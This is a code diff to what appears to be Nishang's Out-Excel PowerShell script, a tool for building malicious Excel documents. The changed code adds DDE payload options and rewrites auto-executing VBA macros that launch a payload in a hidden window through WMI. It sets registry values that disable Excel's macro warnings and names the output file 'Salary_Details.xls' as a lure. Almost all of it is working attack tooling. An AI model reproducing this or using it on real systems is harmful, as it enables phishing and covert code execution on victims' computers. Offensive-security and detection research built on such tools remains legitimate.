@@ -119,8 +119,8 @@ https://github.com/samratashok/nishang
 #>
 
 
-    [CmdletBinding()] Param(
-        [Parameter(Position=0, Mandatory = $False)]
+    [CmdletBinding(DefaultParameterSetName="None")] Param(
+        [Parameter(ParameterSetName="Macro",Position=0, Mandatory = $False)]
         [String]
         $Payload,
         
@@ -136,27 +136,31 @@ https://github.com/samratashok/nishang
         [String]
         $Arguments,
 
-        [Parameter(Position=4, Mandatory = $False)]
+        [Parameter(ParameterSetName="DDE",Position=0, Mandatory = $False)]
         [Switch]
         $DDE,
-        
-        [Parameter(Position=5, Mandatory = $False)]
+
+        [Parameter(ParameterSetName="DDE",Position=1, Mandatory = $False)]
         [String]
-        $ExcelFileDir,
+        $DDEPayload,
         
         [Parameter(Position=6, Mandatory = $False)]
         [String]
+        $ExcelFileDir,
+        
+        [Parameter(Position=7, Mandatory = $False)]
+        [String]
         $OutputFile="$pwd\Salary_Details.xls",
 
-        [Parameter(Position=7, Mandatory = $False)]
+        [Parameter(Position=8, Mandatory = $False)]
         [Switch]
         $Recurse,
         
-        [Parameter(Position=8, Mandatory = $False)]
+        [Parameter(Position=9, Mandatory = $False)]
         [Switch]
         $RemoveXlsx,
 
-        [Parameter(Position=9, Mandatory = $False)]
+        [Parameter(Position=10, Mandatory = $False)]
         [Switch]
         $RemainUnSafe
     )
@@ -192,7 +196,7 @@ https://github.com/samratashok/nishang
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
 
-    if(!$Payload)
+    if(!$Payload -and !$DDEPayload)
     {
         #Download-Execute payload for DDE
         # User prompt modification technique from https://null-byte.wonderhowto.com/how-to/exploit-dde-microsoft-office-defend-against-dde-based-attacks-0180706/
@@ -286,51 +290,94 @@ https://github.com/samratashok/nishang
         {
             $FinalPayload = $FinalPayload + "& " + '"' + $Payload.Substring($index*800, $remainingindex) + '"' 
         }
-        $Payload = $FinalPayload
+        #Macro Code
+        #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
+        $CodeAuto = @"
+        Sub Auto_Open()
+        Execute
+
+        End Sub
+
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create $FinalPayload, Null, objConfig, intProcessID
+             End Function
+"@
+
+        $CodeWorkbook = @"
+        Sub Workbook_Open()
+        Execute
+
+        End Sub
+
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create $FinalPayload, Null, objConfig, intProcessID
+             End Function
+"@
+    }
+     #If the payload is small in size, there is no need of multiline macro.
+    else
+    {
+        # Escape double quotes. Useful for regsvr32 payloads where double quotes are used. 
+        $FinalPayload = $Payload -replace '"','""'
+        $CodeAuto = @"
+        Sub Auto_Open()
+        Execute
+
+        End Sub
+
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create "$FinalPayload", Null, objConfig, intProcessID
+             End Function
+"@
+
+        $CodeWorkbook = @"
+        Sub Workbook_Open()
+        Execute
+
+        End Sub
+
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create "$Payload", Null, objConfig, intProcessID
+             End Function
+"@
 
     }
-    #Macro Code
-    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
-    $CodeAuto = @"
-    Sub Auto_Open()
-    Execute
-
-    End Sub
-
-
-         Public Function Execute() As Variant
-            Const HIDDEN_WINDOW = 0
-            strComputer = "."
-            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
-            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
-            Set objConfig = objStartup.SpawnInstance_
-            objConfig.ShowWindow = HIDDEN_WINDOW
-            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create "$Payload", Null, objConfig, intProcessID
-         End Function
-"@
-
-    $CodeWorkbook = @"
-    Sub Workbook_Open()
-    Execute
-
-    End Sub
-
-
-         Public Function Execute() As Variant
-            Const HIDDEN_WINDOW = 0
-            strComputer = "."
-            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-         
-            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
-            Set objConfig = objStartup.SpawnInstance_
-            objConfig.ShowWindow = HIDDEN_WINDOW
-            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-            objProcess.Create "$Payload", Null, objConfig, intProcessID
-         End Function
-"@
-
 
 
   
@@ -353,7 +400,7 @@ https://github.com/samratashok/nishang
                 Write-Verbose "Using the DDE technique for dir."
                 if(!$DDEPayload)
                 {
-                    $WorkSheet.Cells.Item(50,50) = $Payloadg
+                    $WorkSheet.Cells.Item(50,50) = $Payload
                 }
                 else
                 {
@@ -464,5 +511,3 @@ https://github.com/samratashok/nishang
         New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
     }
 }
-
-
